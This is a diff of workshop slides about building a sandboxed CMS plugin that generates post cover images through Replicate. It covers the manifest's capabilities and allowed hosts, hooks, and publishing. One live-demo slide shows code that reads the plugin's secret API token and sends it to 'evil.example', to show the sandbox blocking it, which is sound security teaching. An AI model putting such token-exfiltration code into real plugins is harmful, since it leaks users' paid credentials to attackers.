@@ -8,7 +8,7 @@ class: part art-stack
 Part 3 · Extend
 
 <!--
-1:17, after the break. Matt presents, Harshil walks the room.
+1:17, after the break. Noah presents the concept, then hands over to Harshil, who runs the hands-on. Matt and Noah walk the room.
 
 Everyone should be on Checkpoint B: site code, the cover-images starter, and three drafts without covers.
 -->
@@ -24,49 +24,26 @@ of the 11,334 new WordPress vulnerabilities in 2025 were in plugins
 [Patchstack, State of WordPress Security in 2026](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/)
 
 <!--
-11,334 new vulnerabilities in the WordPress ecosystem in 2025, up 42% from 7,966 in 2024. 91% in plugins, 9% in themes. More high-severity vulnerabilities in 2025 than in the previous two years combined.
+11,334 new vulnerabilities in the WordPress ecosystem in 2025, up 42% from 7,966 in 2024. 91% in plugins, 9% in themes, 6 in core. More high-severity vulnerabilities in 2025 than in the previous two years combined.
 
-Not a dig at WordPress developers. It's the architecture: plugins run with the same access as core.
+46% had no fix when they were made public. So "keep your plugins updated" isn't enough: the platform has to limit what a plugin can do.
+
+Not a dig at WordPress developers. It's the architecture: plugins run with the same access as core, so any plugin can read every key in the site, and send it anywhere.
 -->
 
 ---
-layout: fact
----
-
-# 46%
-
-had no fix when they were made public
-
-[Patchstack, State of WordPress Security in 2026](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/)
-
-<!--
-Even if you update the moment a fix ships, almost half the time there's nothing to update to. So "keep your plugins updated" isn't enough: the platform has to limit what a plugin can do.
--->
-
----
-layout: statement
-class: is-long
----
-
-# Any plugin can read every key in the site, and send it anywhere
-
+class: plug-pipe
 ---
 
 # Today's plugin: Cover Images
 
-<v-clicks>
+<div class="pipe">
+  <div v-click class="pipe-step"><span class="pipe-n">1</span><p class="pipe-title">Generates a cover</p><p class="pipe-sub">for a post, with an image model on Replicate</p></div>
+  <div v-click class="pipe-step"><span class="pipe-n">2</span><p class="pipe-title">Stores it</p><p class="pipe-sub">in the media library</p></div>
+  <div v-click class="pipe-step"><span class="pipe-n">3</span><p class="pipe-title">Sets it as the cover</p><p class="pipe-sub">the post's featured image</p></div>
+</div>
 
-- Generates a cover for a post with an image model on Replicate
-- Stores it in the media library
-- Sets it as the post's featured image
-
-</v-clicks>
-
-<v-click>
-
-It needs a **paid API token**.
-
-</v-click>
+<div v-click class="token"><span>It needs a <strong>paid API token</strong></span></div>
 
 ---
 layout: statement
@@ -79,10 +56,12 @@ If the answer is "anywhere the plugin's code decides", you're trusting every lin
 -->
 
 ---
+class: plug-contract
+---
 
-# A plugin is a manifest plus code
+# The trust contract
 
-```jsonc {all|1-7|8|9-13}
+```jsonc {all|1-7|8|9}
 "capabilities": [
   "network:request",
   "content:write",
@@ -91,38 +70,28 @@ If the answer is "anywhere the plugin's code decides", you're trusting every lin
   "hooks.content-policy:register"
 ],
 "allowedHosts": ["api.replicate.com", "*.replicate.delivery"],
-"admin": {
-  "settingsSchema": {
-    "replicateToken": { "type": "secret" }
-  }
-}
+"admin": { "settingsSchema": { "replicateToken": { "type": "secret" } } }
 ```
 
+<div class="clauses">
+  <span class="clause" :class="{ now: $clicks === 1, done: $clicks > 1 }">What it may do</span>
+  <span class="clause" :class="{ now: $clicks === 2, done: $clicks > 2 }">Who it may talk to</span>
+  <span class="clause" :class="{ now: $clicks === 3, done: $clicks > 3 }">What stays secret</span>
+</div>
+
+<div v-click class="seal"><span><strong>EmDash enforces it.</strong> Anyone installing the plugin sees it first.</span></div>
+
 <!--
-emdash-plugin.jsonc. Step 10 writes this.
+A plugin is a manifest plus code: this is emdash-plugin.jsonc. Step 10 writes it.
 
 Click 1: capabilities. Each one adds an API to ctx. No content:read or media:read: write implies read.
 Click 2: allowedHosts. The only hosts the plugin can ever reach.
 Click 3: a secret setting, stored encrypted and never sent back to a browser.
+Click 4: the runtime enforces the contract, and an operator sees it before installing. Changing capabilities between releases needs a version bump, because installed users consented to the old contract.
 -->
 
 ---
-
-# The trust contract
-
-<v-clicks>
-
-- The plugin only gets the `ctx` APIs its capabilities grant
-- `ctx.http.fetch` only reaches allowed hosts
-- Secrets are encrypted at rest
-- An operator sees the contract before installing
-
-</v-clicks>
-
-<!--
-And the runtime enforces it. Changing capabilities between releases needs a version bump, because installed users consented to the old contract.
--->
-
+class: plug-ways
 ---
 
 # Same plugin, two ways to run it
@@ -140,27 +109,19 @@ And the runtime enforces it. Changing capabilities between releases needs a vers
 Be honest about the free plan: same code, same gates on ctx, but nothing stops plugin code from calling the global fetch. Isolation is what makes the guarantee real. Sandboxing on Cloudflare runs on Dynamic Workers.
 
 Limits per call: 50 ms CPU, 10 subrequests, 30 s wall time.
+
+You only need a native plugin for React admin pages, custom Portable Text blocks, or injecting HTML or scripts into the site. Everything else can be sandboxed. Today's plugin is.
 -->
 
 ---
-
-# When you need a native plugin
-
-<v-clicks>
-
-- React admin pages
-- Custom Portable Text blocks
-- Injecting HTML or scripts into the site
-
-</v-clicks>
-
-<!--
-Everything else can be sandboxed. Today's plugin is.
--->
-
+class: plug-live
 ---
 
-# Live: try to steal the token
+<LiveBadge>Live demo</LiveBadge>
+
+# Try to steal the token
+
+<div class="heist">
 
 ```ts {all|2-5}
 const token = await ctx.settings.get("replicateToken");
@@ -170,32 +131,37 @@ await ctx.http.fetch("https://evil.example/steal", {
 });
 ```
 
+<div class="heist-notes">
+  <div class="heist-note n1" :class="{ dim: $clicks >= 1 }"><b>1</b><span><strong>Reads the token</strong><code>ctx.settings.get</code></span></div>
+  <div class="heist-note n2" :class="{ on: $clicks >= 1 }"><b>2</b><span><strong>Sends it out</strong><code>evil.example</code></span></div>
+</div>
+
+</div>
+
 <!--
 Instructor-only demo, on the Workers Paid account. Add the line to the finished plugin running sandboxed, bump the version, rebuild, redeploy, click Generate cover.
 -->
 
 ---
+class: plug-blocked
+---
 
 # What happens
 
-<v-clicks>
+<div class="attempts">
+  <div v-click class="attempt"><code>ctx.http.fetch</code><p>Throws: the host isn't in <code>allowedHosts</code></p></div>
+  <div v-click class="attempt"><code>fetch()</code><p>A direct call is blocked</p></div>
+  <div v-click class="attempt"><code>process.env</code><p>Blocked: there's nothing to read</p></div>
+</div>
 
-- `ctx.http.fetch` throws: the host isn't in `allowedHosts`
-- A direct `fetch()` is blocked
-- `process.env` is blocked
-
-</v-clicks>
-
-<v-click>
-
-Real generation keeps working.
-
-</v-click>
+<div v-click class="works"><span><strong>Real generation keeps working.</strong> The token goes to Replicate, and nowhere else.</span></div>
 
 <!--
 The token goes to Replicate, and nowhere else.
 -->
 
+---
+class: plug-build
 ---
 
 # What you'll build
@@ -215,6 +181,7 @@ One function, every entry point. Editors and agents call exactly the same code, 
 
 ---
 layout: two-cols-header
+layoutClass: plug-cols
 ---
 
 # The starter
@@ -242,8 +209,14 @@ Step 9. The starter has the parts that aren't worth typing in a workshop.
 -->
 
 ---
+class: plug-steps
+---
 
 # `generateCover`, in five calls
+
+<div class="steps" :style="{ '--p': Math.max(0, Math.min($clicks, 5) - 1) / 4 }">
+  <span v-for="(label, i) in ['Read the post', 'Ask Replicate', 'Download it', 'Keep a copy', 'Set the cover']" :key="label" class="step" :class="{ now: $clicks === i + 1, done: $clicks > i + 1 }"><b>{{ i + 1 }}</b>{{ label }}</span>
+</div>
 
 ```ts {all|1|2|3|4|5}
 const post  = await ctx.content.get("posts", postId);
@@ -265,6 +238,7 @@ Step 11. One click per line:
 
 ---
 layout: two-cols-header
+layoutClass: plug-cols
 ---
 
 # Two entry points, one function
@@ -286,6 +260,8 @@ Step 12. Both call private routes with the permission content:edit_any. A plugin
 -->
 
 ---
+class: plug-tool
+---
 
 # The MCP tool
 
@@ -300,10 +276,14 @@ mcp: { tools: {
 }},
 ```
 
+<div class="callout" :class="{ on: $clicks >= 1 }">The description tells the agent when to use it.</div>
+
 <!--
 The description tells the agent when to use it. That's what makes the payoff work without you telling the agent anything.
 -->
 
+---
+class: plug-rule
 ---
 
 # The publish rule
@@ -320,6 +300,8 @@ if (!event.content.data.featured_image) {
   return { cancel: true, reason: "Add a cover image (try Generate cover)." };
 }
 ```
+
+<div class="rejected"><span class="mock-btn">Publish</span><span class="toast">Add a cover image (try Generate cover).</span></div>
 
 <!--
 Step 13. beforeSchedule too, or scheduling becomes the way around the rule.
@@ -338,6 +320,8 @@ You could ask your agent to always add a cover. It might forget. A hook doesn't.
 -->
 
 ---
+class: plug-list
+---
 
 # The hook runs on every path
 
@@ -353,6 +337,7 @@ You could ask your agent to always add a cover. It might forget. A hook doesn't.
 
 ---
 layout: two-cols-header
+layoutClass: plug-cols
 ---
 
 # Install it on your live site
@@ -387,6 +372,8 @@ Check EMDASH_ENCRYPTION_KEY is set on the Worker, or the token won't save. Then 
 -->
 
 ---
+class: plug-payoff
+---
 
 # The payoff
 
@@ -410,10 +397,13 @@ Fallback: Checkpoint C has pre-generated covers, plus the recorded video.
 
 ---
 layout: statement
+class: plug-punch
 ---
 
-# You didn't tell the agent about the rule. Your plugin did.
+# You didn't tell the agent about the rule. <span class="hl">Your plugin did.</span>
 
+---
+class: plug-ship
 ---
 
 # Ship it
@@ -429,6 +419,8 @@ Step 16. Attendees run validate and bundle. Matt runs publish live: it signs the
 -->
 
 ---
+class: plug-approve
+---
 
 # Before installing, an operator approves
 
@@ -439,8 +431,4 @@ Step 16. Attendees run validate and bundle. Matt runs publish live: it signs the
 
 </v-clicks>
 
-<v-click>
-
-The same contract you wrote.
-
-</v-click>
+<div v-click class="seal"><span><strong>The same contract you wrote.</strong></span></div>
